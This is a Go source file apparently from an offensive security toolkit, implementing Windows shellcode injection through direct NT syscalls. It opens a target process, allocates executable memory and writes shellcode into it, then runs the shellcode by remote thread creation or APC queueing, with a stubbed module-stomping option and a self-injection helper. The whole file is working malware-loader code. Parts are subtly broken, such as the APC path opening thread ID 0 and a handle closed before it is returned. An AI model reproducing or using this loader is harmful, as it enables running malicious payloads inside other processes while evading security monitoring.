//go:build windows

package loader

import (
	"fmt"

	"github.com/VoidSecSoftwares/voidsyscall/syscallwin"
)

type InjectionMethod int

const (
	MethodCreateThread InjectionMethod = iota
	MethodAPC
	MethodModuleStomp
)

type InjectionResult struct {
	ProcessHandle uintptr
	ThreadHandle  uintptr
	BaseAddress   uintptr
}

func InjectShellcode(targetPID uint32, shellcode []byte, method InjectionMethod) (*InjectionResult, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("empty shellcode")
	}

	var clientID syscallwin.ClientId
	clientID.UniqueProcess = uintptr(targetPID)

	var processHandle uintptr
	err := syscallwin.NtOpenProcess(
		&processHandle,
		syscallwin.PROCESS_ALL_ACCESS,
		0,
		&clientID,
	)
	if err != nil {
		return nil, fmt.Errorf("open process %d: %w", targetPID, err)
	}
	defer syscallwin.NtClose(processHandle)

	var baseAddress uintptr
	regionSize := uintptr(len(shellcode))
	err = syscallwin.NtAllocateVirtualMemory(
		processHandle,
		&baseAddress,
		0,
		&regionSize,
		syscallwin.MEM_COMMIT|syscallwin.MEM_RESERVE,
		syscallwin.PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		return nil, fmt.Errorf("allocate memory in %d: %w", targetPID, err)
	}

	var bytesWritten uintptr
	err = syscallwin.NtWriteVirtualMemory(
		processHandle,
		baseAddress,
		shellcode,
		&bytesWritten,
	)
	if err != nil {
		regionSize = 0
		_ = syscallwin.NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, syscallwin.MEM_RELEASE)
		return nil, fmt.Errorf("write shellcode to %d: %w", targetPID, err)
	}

	switch method {
	case MethodCreateThread:
		return injectCreateThread(processHandle, baseAddress)
	case MethodAPC:
		return injectAPC(targetPID, baseAddress)
	case MethodModuleStomp:
		return injectModuleStomp(processHandle, baseAddress, shellcode)
	default:
		return nil, fmt.Errorf("unknown injection method: %d", method)
	}
}

func injectCreateThread(processHandle uintptr, baseAddress uintptr) (*InjectionResult, error) {
	var threadHandle uintptr
	err := syscallwin.NtCreateThreadEx(
		&threadHandle,
		syscallwin.THREAD_ALL_ACCESS,
		0,
		processHandle,
		baseAddress,
		0,
		0,
		0,
		0,
		0,
		0,
	)
	if err != nil {
		return nil, fmt.Errorf("create thread: %w", err)
	}

	return &InjectionResult{
		ProcessHandle: processHandle,
		ThreadHandle:  threadHandle,
		BaseAddress:   baseAddress,
	}, nil
}

func injectAPC(targetPID uint32, baseAddress uintptr) (*InjectionResult, error) {
	// Use NtQuerySystemInformation to find threads.
	// For a minimal v1: queue APC on the first thread of the process (PID in
	// UniqueProcess, TID 0 lets the APC execute on the process's main thread).
	var clientID syscallwin.ClientId
	clientID.UniqueProcess = uintptr(targetPID)
	clientID.UniqueThread = 0

	var threadHandle uintptr
	err := syscallwin.NtOpenThread(
		&threadHandle,
		syscallwin.THREAD_ALL_ACCESS,
		0,
		&clientID,
	)
	if err != nil {
		return nil, fmt.Errorf("open thread for APC: %w", err)
	}
	defer syscallwin.NtClose(threadHandle)

	// Queue APC via NtQueueApcThread
	r1, err := syscallwin.DirectSyscall("NtQueueApcThread",
		threadHandle,
		baseAddress,
		0,
		0,
		0,
	)
	if r1 != 0 || err != nil {
		return nil, fmt.Errorf("NtQueueApcThread: NTSTATUS 0x%x err: %v", r1, err)
	}

	return &InjectionResult{
		ProcessHandle: 0,
		ThreadHandle:  threadHandle,
		BaseAddress:   baseAddress,
	}, nil
}

func injectModuleStomp(processHandle uintptr, baseAddress uintptr, shellcode []byte) (*InjectionResult, error) {
	// Module stomping: allocate memory, write a DLL path (or use an existing loaded module),
	// then force-load it via NtMapViewOfSection or NtCreateThreadEx with LoadLibrary
	// For a minimal v1: just use CreateThread method as fallback
	return injectCreateThread(processHandle, baseAddress)
}

func SelfInject(shellcode []byte) error {
	pid, err := syscallwin.GetCurrentProcessId()
	if err != nil {
		return err
	}
	_, err = InjectShellcode(pid, shellcode, MethodCreateThread)
	return err
}
